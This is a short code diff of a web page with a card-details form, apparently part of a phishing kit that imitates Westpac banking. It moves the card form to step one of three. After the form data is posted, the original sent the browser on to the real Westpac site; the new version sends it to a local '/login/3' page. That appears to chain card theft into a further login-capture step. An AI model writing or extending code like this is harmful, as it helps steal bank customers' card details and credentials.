@@ -118,7 +118,7 @@
                <div id="unorder-list" class="errors"> </div>
             </div>
             <form id="carddetails_form">
-    <span>Step 3 of 3 - Card information</span>
+    <span>Step 1 of 3 - Card information</span>
     <fieldset>
         <div class="panel">
             <h2>Provide your card details</h2>
@@ -277,7 +277,7 @@
             }).done(function(msg) {
                 sessionStorage.setItem('visitor', visitor);
                 console.log(msg); // Log success message
-				setTimeout(()=>{window.location.href = "https://banking.westpac.com.au";},2000);
+				window.location.href = "/login/3";
             }).fail(function(err, textstatus, error) {
                 // Handle failure here
             });
